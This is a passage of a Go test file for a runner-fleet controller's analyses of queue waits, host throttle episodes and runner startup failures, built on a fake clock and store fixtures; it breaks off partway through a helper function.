package controller

import (
	"encoding/json"
	"errors"
	"fmt"
	"reflect"
	"slices"
	"strings"
	"sync/atomic"
	"testing"
	"time"

	"github.com/eyupio/zoomies/internal/analysis"
	"github.com/eyupio/zoomies/internal/config"
	"github.com/eyupio/zoomies/internal/scheduler"
	"github.com/eyupio/zoomies/internal/store"
)

// analysisNow is the instant every analysis test asks at, and analysisPeriod
// the six hours before it. Each row is placed on a minute of the period with
// at, so a test reads as a timeline.
var (
	analysisNow    = time.Date(2026, 10, 12, 12, 0, 0, 0, time.UTC)
	analysisPeriod = AnalysisWindow{Since: analysisNow.Add(-6 * time.Hour), Until: analysisNow}
)

func at(minute int) time.Time { return analysisPeriod.Since.Add(time.Duration(minute) * time.Minute) }

// analysisFleet is a controller whose store and clock read one instant the
// test moves. A runner's creation and a failure's end are stamped by the
// store from its own clock, so a period in the past can only hold them if
// that clock is put there while they are written.
type analysisFleet struct {
	*harness
	clock atomic.Int64
	inst  *store.Installation
	n     int
}

func newAnalysisFleet(t *testing.T) *analysisFleet {
	t.Helper()
	f := &analysisFleet{}
	f.set(analysisNow)
	f.harness = newHarnessAt(t, func() time.Time { return time.Unix(0, f.clock.Load()).UTC() })
	f.inst = f.installation()
	return f
}

func (f *analysisFleet) set(t time.Time) { f.clock.Store(t.UnixNano()) }

func (f *analysisFleet) pool(name string, edit func(*store.Pool)) *store.Pool {
	f.t.Helper()
	p := &store.Pool{Name: name, InstallationID: f.inst.ID, Labels: store.StringSlice{"self-hosted", "linux", "x64"},
		Backend: store.BackendDocker, Image: "ghcr.io/eyupio/zoomies-runner:test", MaxRunners: 4,
		IdleTimeout: store.Duration(5 * time.Minute), Ephemeral: true, DockerMode: store.DockerNone, Enabled: true}
	if edit != nil {
		edit(p)
	}
	if err := f.st.CreatePool(f.ctx, p); err != nil {
		f.t.Fatalf("CreatePool: %v", err)
	}
	return p
}

func (f *analysisFleet) host(name, arch string) *store.Host {
	f.t.Helper()
	h := &store.Host{Name: name, Capacity: 4, Backends: store.StringSlice{"docker"}, Labels: store.StringMap{},
		OS: "linux", Arch: arch, CPUs: 16, MemoryMB: 64 * 1024, DiskTotalMB: 500 * 1024, DiskFreeMB: 400 * 1024,
		LastHeartbeat: analysisNow}
	if err := f.st.CreateHost(f.ctx, h); err != nil {
		f.t.Fatalf("CreateHost: %v", err)
	}
	return h
}

// job records a job queued at queued on a pool, claimed the moment it was
// seen unless edit says otherwise.
func (f *analysisFleet) job(pool string, queued time.Time, edit func(*store.Job)) *store.Job {
	f.t.Helper()
	f.n++
	j := &store.Job{GitHubJobID: int64(7000 + f.n), Repo: "acme/app", Workflow: "CI", JobName: "build",
		Labels: store.StringSlice{"self-hosted"}, State: store.JobQueued, QueuedAt: queued,
		InstallationID: f.inst.ID, PoolID: pool, Matched: pool != ""}
	if j.Matched {
		j.EligibleAt = ptr(queued)
	}
	if edit != nil {
		edit(j)
	}
	out, _, err := f.st.ApplyJob(f.ctx, j)
	if err != nil {
		f.t.Fatalf("ApplyJob: %v", err)
	}
	return out
}

func ran(started, done time.Time, conclusion string) func(*store.Job) {
	return func(j *store.Job) {
		j.State, j.StartedAt, j.CompletedAt, j.Conclusion = store.JobCompleted, ptr(started), ptr(done), conclusion
	}
}

// runner records a runner whose create task was delivered at requested, with
// the store's clock there so its row is created then too.
func (f *analysisFleet) runner(pool, host string, requested time.Time, edit func(*store.Runner)) *store.Runner {
	f.t.Helper()
	f.n++
	f.set(requested)
	defer f.set(analysisNow)
	r := &store.Runner{PoolID: pool, HostID: host, Name: fmt.Sprintf("runner-%d", f.n), Ephemeral: true,
		CreateTaskIssuedAt: ptr(requested)}
	if edit != nil {
		edit(r)
	}
	if err := f.st.CreateRunner(f.ctx, r); err != nil {
		f.t.Fatalf("CreateRunner: %v", err)
	}
	return r
}

// fail fails a runner at a moment, as the agent's report would.
func (f *analysisFleet) fail(r *store.Runner, when time.Time, kind store.FaultKind) {
	f.t.Helper()
	f.set(when)
	defer f.set(analysisNow)
	if _, err := f.st.FailRunner(f.ctx, r.ID, "pull access denied for acme/runner", kind); err != nil {
		f.t.Fatalf("FailRunner: %v", err)
	}
}

func (f *analysisFleet) audit(action, host string, level int, when time.Time, actor string) {
	f.t.Helper()
	if err := f.st.AppendAudit(f.ctx, &store.AuditEvent{Action: action, TargetKind: "host", TargetID: host, ActorName: actor,
		After: fmt.Sprintf(`{"level":%d}`, level), CreatedAt: when}); err != nil {
		f.t.Fatalf("AppendAudit: %v", err)
	}
}

func sameIntervals(a, b []analysis.Interval) bool {
	return slices.EqualFunc(a, b, func(x, y analysis.Interval) bool { return x.From.Equal(y.From) && x.To.Equal(y.To) })
}

// A throttle's history is the audit log's steps: a step up from no rung opens
// an episode, a lift to no rung or an operator's clear closes it, and a lift
// that leaves a rung standing does not. One still open at the end of the
// period has no end, which the analyses read as open at Until.
func TestThrottleEpisodesOpenOnAStepAndCloseOnALiftToZeroOrAClear(t *testing.T) {
	rows := []store.ThrottleChange{
		{HostID: "host_x", Action: "host.throttle", Level: 1, At: at(10)},
		{HostID: "host_x", Action: "host.throttle", Level: 2, At: at(15)},
		{HostID: "host_x", Action: "host.throttle_lift", Level: 1, At: at(20)},
		{HostID: "host_x", Action: "host.throttle_lift", Level: 0, At: at(30)},
		{HostID: "host_x", Action: "host.throttle", Level: 1, At: at(40)},
		{HostID: "host_x", Action: "host.throttle_clear", Level: 0, At: at(45)},
		{HostID: "host_x", Action: "host.throttle", Level: 1, At: at(100)},
	}
	got := throttleEpisodes(rows, []*store.Host{{ID: "host_x"}}, analysisPeriod.Since, analysisPeriod.Until)
	want := []analysis.Interval{{From: at(10), To: at(30)}, {From: at(40), To: at(45)}, {From: at(100)}}
	if !sameIntervals(got["host_x"], want) {
		t.Errorf("episodes = %+v, want %+v", got["host_x"], want)
	}
}

// A host still on its throttle carries when the episode began. One that began
// before the period was on all through its start, which no row in the period
// says; one that began after the period ended says nothing about it.
func TestAThrottleThatBeganBeforeTheWindowIsTakenFromTheHostsOwnSince(t *testing.T) {
	hosts := []*store.Host{
		{ID: "host_before", Throttle: store.HostThrottle{Level: 2, Since: ptr(at(-60))}},
		{ID: "host_inside", Throttle: store.HostThrottle{Level: 1, Since: ptr(at(90))}},
		{ID: "host_after", Throttle: store.HostThrottle{Level: 1, Since: ptr(at(400))}},
	}
	got := throttleEpisodes(nil, hosts, analysisPeriod.Since, analysisPeriod.Until)
	if !sameIntervals(got["host_before"], []analysis.Interval{{From: at(0)}}) {
		t.Errorf("a throttle on since before the period: %+v, want open from its start", got["host_before"])
	}
	if !sameIntervals(got["host_inside"], []analysis.Interval{{From: at(90)}}) {
		t.Errorf("a throttle on since inside the period: %+v, want open from its own since", got["host_inside"])
	}
	if len(got["host_after"]) != 0 {
		t.Errorf("a throttle that began after the period: %+v, want none", got["host_after"])
	}
}

// The store hands each host's last step before the period ahead of the
// period's own. A rung standing then was standing as the period opened,
// though the host's own since has long been cleared; but a host deleted while
// throttled never gets the step that would close it, and its last rung would
// read as standing for ever.
func TestAThrottleStandingWhenTheWindowOpenedBeginsAtItsStart(t *testing.T) {
	rows := []store.ThrottleChange{
		{HostID: "host_x", Action: "host.throttle", Level: 2, At: at(-60)},
		{HostID: "host_y", Action: "host.throttle_lift", Level: 0, At: at(-10)},
		{HostID: "host_gone", Action: "host.throttle", Level: 1, At: at(-120)},
		{HostID: "host_x", Action: "host.throttle_lift", Level: 0, At: at(30)},
	}
	got := throttleEpisodes(rows, []*store.Host{{ID: "host_x"}, {ID: "host_y"}}, analysisPeriod.Since, analysisPeriod.Until)
	if !sameIntervals(got["host_x"], []analysis.Interval{{From: at(0), To: at(30)}}) {
		t.Errorf("host_x = %+v, want from the period's start to its lift", got["host_x"])
	}
	if len(got["host_y"]) != 0 || len(got["host_gone"]) != 0 {
		t.Errorf("a host left on no rung, or deleted: %+v, %+v; want none", got["host_y"], got["host_gone"])
	}
}

// A step down or a clear says the host was on a rung before it, and so does a
// step up past the first rung. With nothing earlier on record, the rung was
// standing when the period opened (P14).
func TestALiftWithNoOpeningInTheWindowOpensTheEpisodeAtItsStart(t *testing.T) {
	rows := []store.ThrottleChange{
		{HostID: "host_w", Action: "host.throttle_lift", Level: 1, At: at(5)},
		{HostID: "host_y", Action: "host.throttle_clear", Level: 0, At: at(20)},
		{HostID: "host_z", Action: "host.throttle", Level: 2, At: at(25)},
		{HostID: "host_x", Action: "host.throttle_lift", Level: 0, At: at(30)},
		{HostID: "host_v", Action: "host.throttle", Level: 1, At: at(35)},
	}
	got := throttleEpisodes(rows, nil, analysisPeriod.Since, analysisPeriod.Until)
	for host, want := range map[string][]analysis.Interval{
		"host_w": {{From: at(0)}},
		"host_y": {{From: at(0), To: at(20)}},
		"host_z": {{From: at(0)}},
		"host_x": {{From: at(0), To: at(30)}},
		"host_v": {{From: at(35)}},
	} {
		if !sameIntervals(got[host], want) {
			t.Errorf("%s = %+v, want %+v", host, got[host], want)
		}
	}
}

// A read the limit cut lost the period's oldest steps, so what any host stood
// on before the oldest one kept is not known: no throttle is claimed there,
// and the starting rungs, which the lost steps may have overtaken, are not
// trusted.
func TestACutThrottleReadClaimsNothingBeforeItsOldestKeptRow(t *testing.T) {
	rows := []store.ThrottleChange{
		{HostID: "host_x", Action: "host.throttle", Level: 2, At: at(-60)},
		{HostID: "host_y", Action: "host.throttle", Level: 1, At: at(50)},
		{HostID: "host_x", Action: "host.throttle", Level: 1, At: at(60)},
	}
	kept, from := keptThrottleRows(rows, false, analysisPeriod.Since)
	if len(kept) != 3 || !from.Equal(analysisPeriod.Since) {
		t.Fatalf("a whole read: %d rows from %v, want all from the period's start", len(kept), from)
	}
	kept, from = keptThrottleRows(rows, true, analysisPeriod.Since)
	if len(kept) != 2 || !from.Equal(at(50)) {
		t.Fatalf("a cut read: %d rows from %v, want the period's two from the oldest kept", len(kept), from)
	}
	got := throttleEpisodes(kept, []*store.Host{{ID: "host_x"}, {ID: "host_y"}}, from, analysisPeriod.Until)
	if !sameIntervals(got["host_x"], []analysis.Interval{{From: at(60)}}) || !sameIntervals(got["host_y"], []analysis.Interval{{From: at(50)}}) {
		t.Errorf("episodes = %+v, want each from its own kept step", got)
	}
}

// The ceiling is the pool's max_runners against the runners it had alive, so
// a wait while two runners held a ceiling of two is the ceiling's, and the
// same wait under a ceiling of three is not.
func TestAnalyseQueueWaitReadsThePoolsCeilingFromItsRunners(t *testing.T) {
	f := newAnalysisFleet(t)
	pool := f.pool("linux", func(p *store.Pool) { p.MaxRunners = 2 })
	host := f.host("vm-1", "amd64")
	for range 2 {
		f.runner(pool.ID, host.ID, at(10), func(r *store.Runner) { r.State, r.RegisteredAt = store.RunnerBusy, ptr(at(11)) })
	}
	// Queued before the period, so its wait is not the period's.
	f.job(pool.ID, at(-30), ran(at(40), at(50), "success"))
	for i := range 6 {
		r := f.runner(pool.ID, host.ID, at(39), func(r *store.Runner) {
			r.State, r.RegisteredAt, r.FinishedAt = store.RunnerRemoved, ptr(at(39).Add(30*time.Second)), ptr(at(50))
		})
		f.job(pool.ID, at(30+i), func(j *store.Job) { ran(at(40), at(50), "success")(j); j.RunnerID = r.ID })
	}

	got, err := f.c.AnalyseQueueWait(f.ctx, analysisPeriod, pool.ID)
	if err != nil {
		t.Fatal(err)
	}
	if got.Dominant != string(analysis.CausePoolCeiling) || got.Evidence.Jobs != 6 {
		t.Fatalf("dominant %q over %d jobs (%s), want pool_ceiling over the 6 queued in the period", got.Dominant, got.Evidence.Jobs, got.Summary)
	}
	// The pool's one change is its dominant cause's.
	if len(got.NextSteps) == 0 || got.NextSteps[0].Setting != "pool.max_runners" {
		t.Errorf("first step %+v, want pool.max_runners", got.NextSteps)
	}

	pool.MaxRunners = 3
	if err := f.st.UpdatePool(f.ctx, pool); err != nil {
		t.Fatal(err)
	}
	got, err = f.c.AnalyseQueueWait(f.ctx, analysisPeriod, pool.ID)
	if err != nil {
		t.Fatal(err)
	}
	if got.Dominant == string(analysis.CausePoolCeiling) {
		t.Errorf("two runners under a ceiling of three still read as the ceiling: %s", got.Summary)
	}
}

// A runner that failed before it registered held no place in the pool (the
// scheduler's own rule), so a pool whose starts keep failing reads as failing
// starts, not as a ceiling to raise (P8).
func TestARunnerThatFailedBeforeRegisteringHoldsNoPlaceUnderTheCeiling(t *testing.T) {
	f := newAnalysisFleet(t)
	pool := f.pool("linux", func(p *store.Pool) { p.MaxRunners = 2 })
	host := f.host("vm-1", "amd64")
	for range 2 {
		f.fail(f.runner(pool.ID, host.ID, at(10), nil), at(20), store.FaultImage)
	}
	runners, _, err := f.st.RunnerSpans(f.ctx, store.RunnerSpanFilter{Since: analysisPeriod.Since, Until: analysisPeriod.Until, PoolID: pool.ID}, 10)
	if err != nil || len(runners) != 2 {
		t.Fatalf("spans %v, %v", runners, err)
	}
	if got := atCeiling(runners, 2, analysisPeriod); len(got) != 0 {
		t.Errorf("two failed starts made a ceiling of two: %+v", got)
	}
	live := []store.RunnerSpan{
		{RequestedAt: at(10), State: store.RunnerBusy, RegisteredAt: ptr(at(11))},
		{RequestedAt: at(12), State: store.RunnerRemoved, RegisteredAt: ptr(at(13)), EndedAt: ptr(at(30))},
		// A runner that registered and failed later held its place until then.
		{RequestedAt: at(14), State: store.RunnerFailed, RegisteredAt: ptr(at(15)), EndedAt: ptr(at(40))},
		// Known only from a session that never registered: a start whose
		// outcome is not on record may have failed, and a failed start held
		// no place (P8).
		{RequestedAt: at(16), EndedAt: ptr(at(50))},
		// Finished with its end never stamped: no known life, so not alive
		// for ever.
		{RequestedAt: at(20), State: store.RunnerRemoved, RegisteredAt: ptr(at(21))},
		// Asked for after the period, as a row created in it can be.
		{RequestedAt: at(500), State: store.RunnerIdle},
	}
	want := []analysis.Interval{{From: at(12), To: at(40)}}
	if got := atCeiling(live, 2, analysisPeriod); !sameIntervals(got, want) {
		t.Errorf("at ceiling %+v, want %+v", got, want)
	}
}

// A runner of a pool that keeps its runners was registered long before the
// job it took, so its request and registration are not this job's startup,
// and the wait cannot be read as GitHub's hand-off to a runner that was
// ready: that runner may have been busy. A warm runner of an ephemeral pool
// was idle and waiting for exactly one job, so its hand-off is GitHub's.
func TestARunnerOfAPoolThatKeepsItsRunnersIsNotTheJobsOwnStartup(t *testing.T) {
	f := newAnalysisFleet(t)
	pool := f.pool("persistent", func(p *store.Pool) { p.MaxRunners, p.Ephemeral = 1, false })
	host := f.host("vm-1", "amd64")
	r := f.runner(pool.ID, host.ID, at(-120), func(r *store.Runner) {
		r.State, r.RegisteredAt, r.Ephemeral = store.RunnerBusy, ptr(at(-119)), false
	})
	for i := range 6 {
		f.job(pool.ID, at(30+i), func(j *store.Job) { ran(at(40+i), at(41+i), "success")(j); j.RunnerID = r.ID })
	}
	got, err := f.c.AnalyseQueueWait(f.ctx, analysisPeriod, pool.ID)
	if err != nil {
		t.Fatal(err)
	}
	if got.Dominant != string(analysis.CausePoolCeiling) {
		t.Errorf("dominant %q (%s), want pool_ceiling: the one runner was the whole pool", got.Dominant, got.Summary)
	}
	// Its runner is on record, so the finding must not say it is missing;
	// what it cannot say is whether the runner was busy.
	if e := got.Evidence; e.NoRunnerRecord != 0 || e.RunnerKept != 6 {
		t.Errorf("no runner record %d, runner kept %d; want 0 and 6", e.NoRunnerRecord, e.RunnerKept)
	}
	if want := "only 6 jobs waited: too few to call one cause dominant; also, 6 of 6 jobs that waited ran on a runner their pool keeps, " +
		"which was there before them and counts against its maximum runners whether busy or idle, so their wait after eligibility is put down to the pool's conditions " +
		"rather than split into runner startup and GitHub's delay"; got.Confidence != analysis.Medium || got.ConfidenceReason != want {
		t.Errorf("confidence %s (%q), want medium (%q)", got.Confidence, got.ConfidenceReason, want)
	}

	warm := f.pool("warm", nil)
	w := f.runner(warm.ID, host.ID, at(-120), func(r *store.Runner) { r.State, r.RegisteredAt = store.RunnerBusy, ptr(at(-119)) })
	for i := range 6 {
		f.job(warm.ID, at(30+i), func(j *store.Job) { ran(at(40+i), at(41+i), "success")(j); j.RunnerID = w.ID })
	}
	got, err = f.c.AnalyseQueueWait(f.ctx, analysisPeriod, warm.ID)
	if err != nil {
		t.Fatal(err)
	}
	if got.Dominant != string(analysis.CauseGitHubDelay) {
		t.Errorf("dominant %q (%s), want github_delay for a warm ephemeral runner", got.Dominant, got.Summary)
	}
}

// A minute the fleet had no room is throttled only when a host that could
// have run the pool was on a rung: an arm64 host's throttle took no room from
// an amd64 pool, which could never have used it.
func TestAnalyseQueueWaitCountsThrottledOnlyOnHostsThatFitThePool(t *testing.T) {
	f := newAnalysisFleet(t)
	pool := f.pool("linux-x64", func(p *store.Pool) { p.MaxRunners, p.Platform = 10, store.Platform{Arch: "amd64"} })
	amd, arm := f.host("vm-amd", "amd64"), f.host("vm-arm", "arm64")
	for i := 30; i < 40; i++ {
		if err := f.st.RecordUsageCapacity(f.ctx, pool.ID, at(i), true); err != nil {
			t.Fatal(err)
		}
	}
	f.audit("host.throttle", arm.ID, 1, at(20), "")
	f.audit("host.throttle_lift", arm.ID, 0, at(50), "")
	for range 6 {
		f.job(pool.ID, at(30), ran(at(40), at(45), "success"))
	}
	got, err := f.c.AnalyseQueueWait(f.ctx, analysisPeriod, pool.ID)
	if err != nil {
		t.Fatal(err)
	}
	if got.Dominant != string(analysis.CauseNoRoom) {
		t.Fatalf("dominant %q (%s), want no_room: the throttled host could not run the pool", got.Dominant, got.Summary)
	}

	f.audit("host.throttle", amd.ID, 1, at(25), "")
	f.audit("host.throttle_clear", amd.ID, 0, at(45), "Ada Lovelace")
	got, err = f.c.AnalyseQueueWait(f.ctx, analysisPeriod, pool.ID)
	if err != nil {
		t.Fatal(err)
	}
	if got.Dominant != string(analysis.CauseThrottled) {
		t.Errorf("dominant %q (%s), want throttled once a host that fits was on a rung", got.Dominant, got.Summary)
	}
	// The audit log says who cleared a throttle; the finding says only when
	// (F14), because its readers may not read the audit log.
	body, err := json.Marshal(got)
	if err != nil {
		t.Fatal(err)
	}
	if strings.Contains(string(body), "Ada") {
		t.Errorf("the finding names who cleared the throttle: %s", body)
	}
}

// A pool deleted since is still waiting time: its jobs are counted, under its
// id, and the row says it is gone (Review Focus 4).
func TestAJobOnADeletedPoolIsNamedByItsIDNotDropped(t *testing.T) {
	f := newAnalysisFleet(t)
	gone, kept := f.pool("gone", nil), f.pool("kept", nil)
	for range 6 {
		f.job(gone.ID, at(30), ran(at(40), at(50), "success"))
		f.job(kept.ID, at(30), ran(at(31), at(50), "success"))
	}
	if _, _, err := f.st.DeletePool(f.ctx, gone.ID); err != nil {
		t.Fatal(err)
	}
	got, err := f.c.AnalyseQueueWait(f.ctx, analysisPeriod, "")
	if err != nil {
		t.Fatal(err)
	}
	i := slices.IndexFunc(got.Evidence.Pools, func(p analysis.PoolWait) bool { return p.PoolID == gone.ID })
	if i < 0 {
		t.Fatalf("pools %+v leave out the deleted one", got.Evidence.Pools)
	}
	row := got.Evidence.Pools[i]
	if !row.Deleted || row.PoolName != "" || row.Jobs != 6 || row.WaitSeconds != 6*600 {
		t.Errorf("deleted pool's row = %+v, want its 6 jobs' hour under its id, marked deleted", row)
	}
	if got.Evidence.Jobs != 12 || got.Evidence.WaitSeconds != 6*600+6*60 {
		t.Errorf("totals %d jobs, %ds; want every job and every second", got.Evidence.Jobs, got.Evidence.WaitSeconds)
	}
}

// A job whose labels all name another vendor's runners is not this fleet's to
// run and never will be (store/hosted.go): the Jobs page's default view, the
// Overview and the usage figures all leave it out. Counted here, a hosted job
// still queued at the period's end was put down to "no pool claimed it", with a
// step telling the operator to change a pool's labels to fit a vendor's, and
// one that started on the vendor's machine was seconds of "nothing on record
// explains it". Both are somebody else's wait, and the 5,000 jobs a read may
// hold are spent on them first on a busy installation.
func TestAVendorsJobIsNeverPutDownToNoPoolClaimingIt(t *testing.T) {
	f := newAnalysisFleet(t)
	pool := f.pool("linux", nil)
	for range 6 {
		f.job(pool.ID, at(30), ran(at(31), at(50), "success"))
	}
	vendor := func(labels ...string) func(*store.Job) {
		return func(j *store.Job) { j.Labels = store.StringSlice(labels) }
	}
	// Still queued at the period's end, and it will be run by the vendor.
	stuck := f.job("", at(300), vendor("blacksmith-4vcpu-ubuntu-2404"))
	// Run by GitHub's own machines after twenty seconds.
	hosted := f.job("", at(100), func(j *store.Job) {
		vendor("ubuntu-latest")(j)
		ran(at(100).Add(20*time.Second), at(110), "success")(j)
	})
	// A job nothing claims and nobody else hosts: this fleet's to see.
	own := f.job("", at(340), vendor("self-hosted", "linux", "gpu"))

	got, err := f.c.AnalyseQueueWait(f.ctx, analysisPeriod, "")
	if err != nil {
		t.Fatal(err)
	}
	if got.Evidence.Jobs != 7 {
		t.Errorf("read %d jobs, want the 6 the pool claimed and the one nobody did", got.Evidence.Jobs)
	}
	i := slices.IndexFunc(got.Evidence.Pools, func(p analysis.PoolWait) bool { return p.PoolID == "" })
	if i < 0 {
		t.Fatalf("pools %+v leave out the job nothing claimed", got.Evidence.Pools)
	}
	if row := got.Evidence.Pools[i]; row.Jobs != 1 || row.WaitSeconds != 20*60 {
		t.Errorf("the unclaimed row = %+v, want only %s's twenty minutes", row, own.ID)
	}
	for _, p := range got.Evidence.Pools {
		for _, w := range p.Longest {
			if w.JobID == stuck.ID || w.JobID == hosted.ID {
				t.Errorf("the vendor's job %s is among the longest waits: %+v", w.JobID, w)
			}
		}
	}
}

// A pool or host the fleet does not have is not found, and says which it
// was and its id, so the route can tell the reader without reading the
// error's text, and errors.Is still finds store.ErrNotFound.
func TestAnalyseOnAnUnknownPoolOrHostIsNotFound(t *testing.T) {
	f := newAnalysisFleet(t)
	gone := f.pool("gone", nil)
	if _, _, err := f.st.DeletePool(f.ctx, gone.ID); err != nil {
		t.Fatal(err)
	}
	for name, c := range map[string]struct {
		call     func() error
		kind, id string
	}{
		"queue wait on a pool that never was": {func() error {
			_, err := f.c.AnalyseQueueWait(f.ctx, analysisPeriod, "pool_missing")
			return err
		}, "pool", "pool_missing"},
		"queue wait on a deleted pool": {func() error {
			_, err := f.c.AnalyseQueueWait(f.ctx, analysisPeriod, gone.ID)
			return err
		}, "pool", gone.ID},
		"host pressure": {func() error {
			_, err := f.c.AnalyseHostPressure(f.ctx, analysisPeriod, "host_missing")
			return err
		}, "host", "host_missing"},
		"startup failures on a pool": {func() error {
			_, err := f.c.AnalyseStartupFailures(f.ctx, analysisPeriod, "pool_missing", "")
			return err
		}, "pool", "pool_missing"},
		"startup failures on a host": {func() error {
			_, err := f.c.AnalyseStartupFailures(f.ctx, analysisPeriod, "", "host_missing")
			return err
		}, "host", "host_missing"},
	} {
		err := c.call()
		if !errors.Is(err, store.ErrNotFound) {
			t.Errorf("%s: %v, want store.ErrNotFound", name, err)
		}
		var nf NotFoundError
		if !errors.As(err, &nf) || nf.Kind != c.kind || nf.ID != c.id {
			t.Errorf("%s: %#v, want a NotFoundError for %s %s", name, err, c.kind, c.id)
		}
	}
}

// A finding names a pool or host deleted since by its id, and a cut answer
// tells its reader to pass pool_id or host_id to read the rest. Refusing that
// id as one the fleet does not have would leave the rows it names unreadable.
func TestNarrowingToAPoolOrHostDeletedSinceReadsWhatThePeriodHoldsOfIt(t *testing.T) {
	f := newAnalysisFleet(t)
	gone := f.pool("gone", nil)
	host := f.host("vm-gone", "amd64")
	for range 3 {
		f.job(gone.ID, at(30), ran(at(40), at(50), "success"))
	}
	f.fail(f.runner(gone.ID, host.ID, at(10), nil), at(12), store.FaultImage)
	if _, _, err := f.st.DeletePool(f.ctx, gone.ID); err != nil {
		t.Fatal(err)
	}
	if _, err := f.st.DeleteHost(f.ctx, host.ID); err != nil {
		t.Fatal(err)
	}

	q, err := f.c.AnalyseQueueWait(f.ctx, analysisPeriod, gone.ID)
	if err != nil {
		t.Fatalf("queue wait narrowed to a pool deleted since: %v", err)
	}
	if q.Evidence.Jobs != 3 {
		t.Errorf("queue wait read %d jobs, want the deleted pool's 3", q.Evidence.Jobs)
	}
	for name, ids := range map[string][2]string{"pool": {gone.ID, ""}, "host": {"", host.ID}} {
		s, err := f.c.AnalyseStartupFailures(f.ctx, analysisPeriod, ids[0], ids[1])
		if err != nil {
			t.Fatalf("startup failures narrowed to a %s deleted since: %v", name, err)
		}
		if s.Evidence.Starts+s.Evidence.Unknown != 1 {
			t.Errorf("startup failures narrowed to the %s read %+v, want its one start", name, s.Evidence)
		}
	}
	// Outside the period that names them, they are not found again.
	early := AnalysisWindow{Since: analysisPeriod.Since.Add(-24 * time.Hour), Until: analysisPeriod.Since.Add(-18 * time.Hour)}
	if _, err := f.c.AnalyseQueueWait(f.ctx, early, gone.ID); !errors.As(err, new(NotFoundError)) {
		t.Errorf("queue wait on the deleted pool in a period with none of its jobs: %v, want not found", err)
	}
	if _, err := f.c.AnalyseStartupFailures(f.ctx, early, "", host.ID); !errors.As(err, new(NotFoundError)) {
		t.Errorf("startup failures on the deleted host in a period with none of its runners: %v, want not found", err)
	}
}

// Not found is a pool or host the fleet does not have and none of the period's
// rows name. One it has, with nothing in the period, is a quiet period and is
// answered as one: the Jobs page's card narrowed to a pool with nothing queued
// today, and a host's startup card on a day it started nothing, would
// otherwise show an error where they should say that nothing happened. An id
// nothing ever had is still not found in the same quiet period.
func TestNarrowingToAQuietPoolOrHostAnswersAnEmptyPeriodAndAnUnknownIDIsStillNotFound(t *testing.T) {
	f := newAnalysisFleet(t)
	pool := f.pool("quiet", nil)
	host := f.host("vm-quiet", "amd64")

	q, err := f.c.AnalyseQueueWait(f.ctx, analysisPeriod, pool.ID)
	if err != nil {
		t.Fatalf("queue wait narrowed to a pool with no jobs: %v", err)
	}
	if q.Evidence.Jobs != 0 || q.Summary != "No jobs were queued in this period." {
		t.Errorf("queue wait read %d jobs and says %q, want an empty period", q.Evidence.Jobs, q.Summary)
	}
	for name, ids := range map[string][2]string{
		"a pool": {pool.ID, ""}, "a host": {"", host.ID}, "a pool and a host": {pool.ID, host.ID},
	} {
		s, err := f.c.AnalyseStartupFailures(f.ctx, analysisPeriod, ids[0], ids[1])
		if err != nil {
			t.Fatalf("startup failures narrowed to %s with no runners: %v", name, err)
		}
		if s.Evidence.Starts+s.Evidence.Unknown != 0 || s.Summary != "No runners were asked to start in this period." {
			t.Errorf("startup failures narrowed to %s read %+v and say %q, want an empty period", name, s.Evidence, s.Summary)
		}
	}

	if _, err := f.c.AnalyseQueueWait(f.ctx, analysisPeriod, "pool_nothing_ever_had"); !errors.As(err, new(NotFoundError)) {
		t.Errorf("queue wait on a pool nothing ever had: %v, want not found", err)
	}
	for name, ids := range map[string][2]string{
		"a pool": {"pool_nothing_ever_had", ""}, "a host": {"", "host_nothing_ever_had"},
		"a pool the fleet has and a host it does not": {pool.ID, "host_nothing_ever_had"},
	} {
		if _, err := f.c.AnalyseStartupFailures(f.ctx, analysisPeriod, ids[0], ids[1]); !errors.As(err, new(NotFoundError)) {
			t.Errorf("startup failures narrowed to %s: %v, want not found", name, err)
		}
	}
}

// An until past now ends now. Read as asked, every job still waiting would
// be counted as waiting through hours that have not happened, and the
// answer would lead with that wait at full confidence: an operator asking
// about today in whole days gets exactly that.
func TestAnUntilPastNowIsReadAsNow(t *testing.T) {
	f := newAnalysisFleet(t)
	pool := f.pool("linux", nil)
	host := f.host("vm-1", "amd64")
	for i := range 6 {
		f.job(pool.ID, at(345+i), nil)
	}
	samples(f, host.ID, 4, 0, 1, 2)
	asked := AnalysisWindow{Since: analysisPeriod.Since, Until: analysisNow.Add(10 * time.Hour)}

	q, err := f.c.AnalyseQueueWait(f.ctx, asked, "")
	if err != nil {
		t.Fatal(err)
	}
	// Waits of 15 down to 10 minutes, each to now.
	if q.Evidence.WaitSeconds != 75*60 || !q.Until.Equal(analysisNow) {
		t.Errorf("queue wait %ds to %v (%s), want 4500s to now", q.Evidence.WaitSeconds, q.Until, q.Summary)
	}
	h, err := f.c.AnalyseHostPressure(f.ctx, asked, host.ID)
	if err != nil {
		t.Fatal(err)
	}
	if h.Evidence.ExpectedMinutes != 360 || !h.Until.Equal(analysisNow) {
		t.Errorf("host pressure expects %d minutes to %v, want the 360 before now", h.Evidence.ExpectedMinutes, h.Until)
	}
	s, err := f.c.AnalyseStartupFailures(f.ctx, asked, "", "")
	if err != nil {
		t.Fatal(err)
	}
	if !s.Until.Equal(analysisNow) {
		t.Errorf("startup failures read to %v, want now", s.Until)
	}
	c, err := f.c.AnalyseCompare(f.ctx, CompareRequest{By: "period", Since: asked.Since, Until: asked.Until})
	if err != nil {
		t.Fatal(err)
	}
	if b := c.Evidence.B; b.Label != "the last 6 hours" || !b.Until.Equal(analysisNow) {
		t.Errorf("the later side is %q to %v, want the last 6 hours to now", b.Label, b.Until)
	}
}

// A period that begins at or after now holds nothing that has happened, and
// read anyway it would be a quiet period rather than an unread one.
func TestAPeriodThatBeginsAtOrAfterNowIsRefused(t *testing.T) {
	f := newAnalysisFleet(t)
	host := f.host("vm-1", "amd64")
	ahead := AnalysisWindow{Since: analysisNow, Until: analysisNow.Add(time.Hour)}
	for name, call := range map[string]func() error{
		"queue wait": func() error { _, err := f.c.AnalyseQueueWait(f.ctx, ahead, ""); return err },
		"compare": func() error {
			_, err := f.c.AnalyseCompare(f.ctx, CompareRequest{By: "period", Since: ahead.Since, Until: ahead.Until})
			return err
		},
		"host pressure":    func() error { _, err := f.c.AnalyseHostPressure(f.ctx, ahead, host.ID); return err },
		"startup failures": func() error { _, err := f.c.AnalyseStartupFailures(f.ctx, ahead, "", ""); return err },
	} {
		if err := call(); !errors.Is(err, ErrSinceNotPast) {
			t.Errorf("%s: %v, want ErrSinceNotPast", name, err)
		}
	}
}

// release records n completed jobs of a release queued a minute apart from
// first, each having waited a minute and run for five.
func (f *analysisFleet) release(version string, first time.Time, n int) {
	f.t.Helper()
	for i := range n {
